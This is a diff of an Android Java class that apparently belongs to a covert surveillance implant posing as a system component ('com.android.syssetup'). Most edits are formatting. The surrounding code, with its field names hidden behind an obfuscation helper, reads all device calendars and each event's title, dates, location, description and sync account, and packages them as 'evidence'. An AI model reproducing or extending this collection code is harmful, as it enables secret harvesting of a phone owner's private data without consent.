@@ -1,16 +1,11 @@
 package com.android.syssetup.module;
 
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-import java.util.Date;
-import java.util.HashMap;
-import java.util.Hashtable;
-
 import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 
+import com.android.mm.M;
 import com.android.syssetup.ProcessInfo;
 import com.android.syssetup.ProcessStatus;
 import com.android.syssetup.Status;
@@ -27,7 +22,12 @@ import com.android.syssetup.util.Check;
 import com.android.syssetup.util.DataBuffer;
 import com.android.syssetup.util.DateTime;
 import com.android.syssetup.util.WChar;
-import com.android.mm.M;
+
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.util.Date;
+import java.util.HashMap;
+import java.util.Hashtable;
 
 public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> {
 
@@ -186,12 +186,12 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 			}
 		}
 
-        if (calendars == null || calendars.isEmpty()) {
-            if (Cfg.DEBUG) {
-                Check.log(TAG + " (calendar): not available"); //$NON-NLS-1$
-            }
-            return false;
-        }
+		if (calendars == null || calendars.isEmpty()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (calendar): not available"); //$NON-NLS-1$
+			}
+			return false;
+		}
 
 
 		boolean needToSerialize = false;
@@ -218,9 +218,9 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 
 			Cursor eventCursor = managedQuery(
 					builder.build(),
-					new String[] {
+					new String[]{
 							M.e("_id"), M.e("title"), M.e("dtstart"), M.e("dtend"), //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
-							M.e("rrule"), M.e("allDay"), M.e("eventLocation"), M.e("description") }, M.e("calendar_id") + "=" + id, null, M.e("_id ASC")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
+							M.e("rrule"), M.e("allDay"), M.e("eventLocation"), M.e("description")}, M.e("calendar_id") + "=" + id, null, M.e("_id ASC")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
 
 			while (eventCursor.moveToNext()) {
 				int index = 0;
@@ -235,7 +235,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 				// final String syncAccount = eventCursor.getString(5);
 
 				final String description = eventCursor.getString(index++);
-		
+
 				String syncAccount = calendars.get(id); //$NON-NLS-1$
 
 				if (Cfg.DEBUG) {
@@ -243,7 +243,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 							+ allDay + " Location: " + location + " SyncAccount:" + syncAccount + " Description: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 							+ description);
 				}
-				
+
 				String desc = "account: " + syncAccount + "\n" + description;
 
 				byte[] packet = null;
@@ -293,8 +293,8 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 				Check.log(TAG + " (selectCalendars) provider: %s", contentProvider);
 			}
 
-			String[] projection = new String[] {
-					M.e("_id"), "account_name", "calendar_displayName", "ownerAccount" }; //$NON-NLS-1$
+			String[] projection = new String[]{
+					M.e("_id"), "account_name", "calendar_displayName", "ownerAccount"}; //$NON-NLS-1$
 			// Uri calendars = Uri.parse("content://calendar/calendars");
 			Uri calendars = Uri.parse(contentProvider + M.e("/calendars")); //$NON-NLS-1$
 			Hashtable<String, String> calendarIds = new Hashtable<String, String>();
@@ -326,7 +326,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 	}
 
 	private Cursor managedQuery(Uri calendars, String[] projection, String selection, String[] selectionArgs,
-			String sortOrder) {
+	                            String sortOrder) {
 		Context context = Status.getAppContext();
 		ContentResolver contentResolver = context.getContentResolver();
 
@@ -337,7 +337,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 
 	/**
 	 * Save evidence Calendar
-	 * 
+	 *
 	 * @param idEvent
 	 * @param packet
 	 */
@@ -350,7 +350,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 	}
 
 	private byte[] preparePacket(long idEvent, String title, String description, String location, Date begin, Date end,
-			String rrule, Boolean allDay) {
+	                             String rrule, Boolean allDay) {
 		final int version = 0x01000000;
 		int flags = 0;
 
